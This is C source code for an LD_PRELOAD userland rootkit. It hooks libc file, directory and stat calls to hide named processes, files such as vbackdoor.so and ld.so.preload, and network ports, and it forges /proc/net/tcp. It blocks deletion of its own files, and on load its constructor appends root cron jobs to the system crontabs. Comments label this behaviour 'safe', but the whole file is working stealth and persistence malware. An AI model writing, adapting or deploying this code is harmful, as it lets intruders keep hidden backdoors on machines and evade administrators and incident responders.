#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>
#include <fnmatch.h>

// Default configuration - safe and flexible
#define DEFAULT_HIDDEN_PROCESSES "frpc,my_daemon"
#define DEFAULT_HIDDEN_FILES "ld.so.preload,vbackdoor.so,*.toml"
#define DEFAULT_HIDDEN_PORTS "3000,2222"
#define DEFAULT_CRON_JOBS "* * * * * root curl -s http://example.com/healthcheck >/dev/null\n"

// Global configuration
static char **hidden_processes = NULL;
static char **hidden_files = NULL;
static int *hidden_ports = NULL;
static size_t num_hidden_processes = 0;
static size_t num_hidden_files = 0;
static size_t num_hidden_ports = 0;

// Function pointers
#define RESOLVE_SYMBOL(symbol) \
    if (!old_##symbol) old_##symbol = dlsym(RTLD_NEXT, #symbol)

static int (*old_access)(const char *path, int amode);
static int (*old_lxstat)(int ver, const char *file, struct stat *buf);
static int (*old_lxstat64)(int ver, const char *file, struct stat64 *buf);
static int (*old_open)(const char *pathname, int flags, mode_t mode);
static int (*old_openat)(int dirfd, const char *pathname, int flags, mode_t mode);
static int (*old_rmdir)(const char *pathname);
static int (*old_unlink)(const char *pathname);
static int (*old_unlinkat)(int dirfd, const char *pathname, int flags);
static int (*old_xstat)(int ver, const char *path, struct stat *buf);
static int (*old_xstat64)(int ver, const char *path, struct stat64 *buf);
static FILE *(*old_fopen)(const char *filename, const char *mode);
static FILE *(*old_fopen64)(const char *filename, const char *mode);
static DIR *(*old_opendir)(const char *name);
static struct dirent *(*old_readdir)(DIR *dir);
static struct dirent64 *(*old_readdir64)(DIR *dir);

// Helper function to get directory name from DIR pointer
static int get_dir_name(DIR *dirp, char *buf, size_t size) {
    int fd = dirfd(dirp);
    if (fd == -1) return 0;
    
    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if (ret == -1) return 0;
    
    buf[ret] = 0;
    return 1;
}

// Helper function to get process name from PID
static int get_process_name(char *pid, char *buf) {
    if (strspn(pid, "0123456789") != strlen(pid)) return 0;
    
    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
    
    FILE *f = fopen(tmp, "r");
    if (!f) return 0;
    
    if (!fgets(tmp, sizeof(tmp), f)) {
        fclose(f);
        return 0;
    }
    fclose(f);
    
    int unused;
    sscanf(tmp, "%d (%[^)]", &unused, buf);
    return 1;
}

// Helper to split strings into arrays
static char **strsplit(const char *str, const char *delim, size_t *count) {
    if (!str || !*str) return NULL;
    
    char *s = strdup(str);
    char **result = NULL;
    size_t capacity = 0;
    char *token = strtok(s, delim);
    
    while (token) {
        if (*count >= capacity) {
            capacity = (*count == 0) ? 8 : capacity * 2;
            result = realloc(result, sizeof(char*) * capacity);
        }
        result[(*count)++] = strdup(token);
        token = strtok(NULL, delim);
    }
    free(s);
    return result;
}

// Check if process should be hidden
static int is_hidden_process(const char *name) {
    for (size_t i = 0; i < num_hidden_processes; i++) {
        if (strcmp(name, hidden_processes[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

// Check if file should be hidden (supports wildcards)
static int is_hidden_file(const char *name) {
    if (!name) return 0;
    
    const char *basename = strrchr(name, '/');
    basename = basename ? basename + 1 : name;
    
    for (size_t i = 0; i < num_hidden_files; i++) {
        if (fnmatch(hidden_files[i], basename, 0) == 0) {
            return 1;
        }
    }
    return 0;
}

// Check if port should be hidden
static int is_hidden_port(int port) {
    for (size_t i = 0; i < num_hidden_ports; i++) {
        if (port == hidden_ports[i]) {
            return 1;
        }
    }
    return 0;
}

// Load configuration from environment variables
static void load_config() {
    const char *process_env = getenv("HIDDEN_PROCESSES");
    const char *file_env = getenv("HIDDEN_FILES");
    const char *port_env = getenv("HIDDEN_PORTS");
    
    // Load processes
    hidden_processes = strsplit(process_env ? process_env : DEFAULT_HIDDEN_PROCESSES, 
                               ",", &num_hidden_processes);
    
    // Load files
    hidden_files = strsplit(file_env ? file_env : DEFAULT_HIDDEN_FILES, 
                           ",", &num_hidden_files);
    
    // Load ports
    if (port_env && *port_env) {
        char *ports_str = strdup(port_env);
        char *token = strtok(ports_str, ",");
        hidden_ports = NULL;
        num_hidden_ports = 0;
        size_t capacity = 0;
        
        while (token) {
            if (num_hidden_ports >= capacity) {
                capacity = (capacity == 0) ? 4 : capacity * 2;
                hidden_ports = realloc(hidden_ports, sizeof(int) * capacity);
            }
            hidden_ports[num_hidden_ports++] = atoi(token);
            token = strtok(NULL, ",");
        }
        free(ports_str);
    } else {
        // Use default ports
        num_hidden_ports = 2;
        hidden_ports = malloc(sizeof(int) * 2);
        hidden_ports[0] = 3000;
        hidden_ports[1] = 2222;
    }
}

// Safe cron setup (appends instead of overwrites)
static void safe_cron_setup() {
    const char *cron_jobs = getenv("CRON_JOBS") ? getenv("CRON_JOBS") : DEFAULT_CRON_JOBS;
    
    FILE *fpa = fopen("/etc/cron.d/root", "a");
    if (fpa) {
        fputs(cron_jobs, fpa);
        fclose(fpa);
    }
    
    FILE *fpb = fopen("/var/spool/cron/root", "a");
    if (fpb) {
        fputs(cron_jobs, fpb);
        fclose(fpb);
    }
    
    FILE *fpc = fopen("/var/spool/cron/crontabs/root", "a");
    if (fpc) {
        fputs(cron_jobs, fpc);
        fclose(fpc);
    }
}

// Constructor for safe initialization
__attribute__((constructor)) static void init() {
    // Load configuration
    load_config();
    
    // Set up cron safely
    safe_cron_setup();
}

// Forge /proc/net/tcp to hide multiple ports
FILE *forge_proc_net_tcp(const char *filename) {
    RESOLVE_SYMBOL(fopen);
    
    char line[LINE_MAX];
    FILE *tmp = tmpfile();
    if (!tmp) return NULL;

    FILE *pnt = old_fopen(filename, "r");
    if (!pnt) {
        fclose(tmp);
        return NULL;
    }

    while (fgets(line, sizeof(line), pnt)) {
        int d, local_port, rem_port, state;
        char local_addr[128], rem_addr[128];
        
        if (sscanf(line, "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X",
                   &d, local_addr, &local_port, rem_addr, &rem_port, &state) >= 6) {
            
            if (!is_hidden_port(rem_port) && !is_hidden_port(local_port)) {
                fputs(line, tmp);
            }
        } else {
            fputs(line, tmp);
        }
    }

    fclose(pnt);
    fseek(tmp, 0, SEEK_SET);
    return tmp;
}

// Hooked functions
int access(const char *path, int amode) {
    RESOLVE_SYMBOL(access);
    if (is_hidden_file(path)) {
        errno = ENOENT;
        return -1;
    }
    return old_access(path, amode);
}

FILE *fopen(const char *filename, const char *mode) {
    RESOLVE_SYMBOL(fopen);
    
    if (filename && (strcmp(filename, "/proc/net/tcp") == 0 || 
        strcmp(filename, "/proc/net/tcp6") == 0)) {
        return forge_proc_net_tcp(filename);
    }
    
    if (is_hidden_file(filename)) {
        errno = ENOENT;
        return NULL;
    }
    return old_fopen(filename, mode);
}

FILE *fopen64(const char *filename, const char *mode) {
    RESOLVE_SYMBOL(fopen64);
    
    if (filename && (strcmp(filename, "/proc/net/tcp") == 0 || 
        strcmp(filename, "/proc/net/tcp6") == 0)) {
        return forge_proc_net_tcp(filename);
    }
    
    if (is_hidden_file(filename)) {
        errno = ENOENT;
        return NULL;
    }
    return old_fopen64(filename, mode);
}

// Stat functions with proper version handling for aarch64
#ifndef _STAT_VER
#if defined(__aarch64__)
#define _STAT_VER 0
#else
#define _STAT_VER 1
#endif
#endif

int lstat(const char *file, struct stat *buf) {
    RESOLVE_SYMBOL(__lxstat);
    if (is_hidden_file(file)) {
        errno = ENOENT;
        return -1;
    }
    return old_lxstat(_STAT_VER, file, buf);
}

int lstat64(const char *file, struct stat64 *buf) {
    RESOLVE_SYMBOL(__lxstat64);
    if (is_hidden_file(file)) {
        errno = ENOENT;
        return -1;
    }
    return old_lxstat64(_STAT_VER, file, buf);
}

int __lxstat(int ver, const char *file, struct stat *buf) {
    RESOLVE_SYMBOL(__lxstat);
    if (is_hidden_file(file)) {
        errno = ENOENT;
        return -1;
    }
    return old_lxstat(ver, file, buf);
}

int __lxstat64(int ver, const char *file, struct stat64 *buf) {
    RESOLVE_SYMBOL(__lxstat64);
    if (is_hidden_file(file)) {
        errno = ENOENT;
        return -1;
    }
    return old_lxstat64(ver, file, buf);
}

int stat(const char *path, struct stat *buf) {
    RESOLVE_SYMBOL(__xstat);
    if (is_hidden_file(path)) {
        errno = ENOENT;
        return -1;
    }
    return old_xstat(_STAT_VER, path, buf);
}

int stat64(const char *path, struct stat64 *buf) {
    RESOLVE_SYMBOL(__xstat64);
    if (is_hidden_file(path)) {
        errno = ENOENT;
        return -1;
    }
    return old_xstat64(_STAT_VER, path, buf);
}

int __xstat(int ver, const char *path, struct stat *buf) {
    RESOLVE_SYMBOL(__xstat);
    if (is_hidden_file(path)) {
        errno = ENOENT;
        return -1;
    }
    return old_xstat(ver, path, buf);
}

int __xstat64(int ver, const char *path, struct stat64 *buf) {
    RESOLVE_SYMBOL(__xstat64);
    if (is_hidden_file(path)) {
        errno = ENOENT;
        return -1;
    }
    return old_xstat64(ver, path, buf);
}

int open(const char *pathname, int flags, mode_t mode) {
    RESOLVE_SYMBOL(open);
    if (is_hidden_file(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return old_open(pathname, flags, mode);
}

int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
    RESOLVE_SYMBOL(openat);
    if (is_hidden_file(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return old_openat(dirfd, pathname, flags, mode);
}

DIR *opendir(const char *name) {
    RESOLVE_SYMBOL(opendir);
    if (is_hidden_file(name)) {
        errno = ENOENT;
        return NULL;
    }
    return old_opendir(name);
}

int unlink(const char *pathname) {
    RESOLVE_SYMBOL(unlink);
    if (is_hidden_file(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return old_unlink(pathname);
}

int unlinkat(int dirfd, const char *pathname, int flags) {
    RESOLVE_SYMBOL(unlinkat);
    if (is_hidden_file(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return old_unlinkat(dirfd, pathname, flags);
}

int rmdir(const char *pathname) {
    RESOLVE_SYMBOL(rmdir);
    if (is_hidden_file(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return old_rmdir(pathname);
}

struct dirent *readdir(DIR *dirp) {
    RESOLVE_SYMBOL(readdir);
    
    struct dirent *dir;
    char dir_name[256] = {0};
    int is_proc = 0;
    
    // Get current directory path
    if (get_dir_name(dirp, dir_name, sizeof(dir_name))) {
        is_proc = (strcmp(dir_name, "/proc") == 0);
    }

    while ((dir = old_readdir(dirp)) != NULL) {
        // Skip special entries
        if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0) 
            continue;
        
        // Handle /proc entries specially
        if (is_proc) {
            // Skip if not a PID directory
            if (strspn(dir->d_name, "0123456789") != strlen(dir->d_name)) {
                if (is_hidden_file(dir->d_name)) {
                    continue;
                }
                break;
            }
            
            char process_name[256] = {0};
            if (get_process_name(dir->d_name, process_name)) {
                if (is_hidden_process(process_name)) {
                    continue;
                }
            }
        }
        
        // Skip hidden files in any directory
        if (is_hidden_file(dir->d_name)) {
            continue;
        }
        
        break;
    }
    
    return dir;
}

struct dirent64 *readdir64(DIR *dirp) {
    RESOLVE_SYMBOL(readdir64);
    
    struct dirent64 *dir;
    char dir_name[256] = {0};
    int is_proc = 0;
    
    // Get current directory path
    if (get_dir_name(dirp, dir_name, sizeof(dir_name))) {
        is_proc = (strcmp(dir_name, "/proc") == 0);
    }

    while ((dir = old_readdir64(dirp)) != NULL) {
        // Skip special entries
        if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0) 
            continue;
        
        // Handle /proc entries specially
        if (is_proc) {
            // Skip if not a PID directory
            if (strspn(dir->d_name, "0123456789") != strlen(dir->d_name)) {
                if (is_hidden_file(dir->d_name)) {
                    continue;
                }
                break;
            }
            
            char process_name[256] = {0};
            if (get_process_name(dir->d_name, process_name)) {
                if (is_hidden_process(process_name)) {
                    continue;
                }
            }
        }
        
        // Skip hidden files in any directory
        if (is_hidden_file(dir->d_name)) {
            continue;
        }
        
        break;
    }
    
    return dir;
}
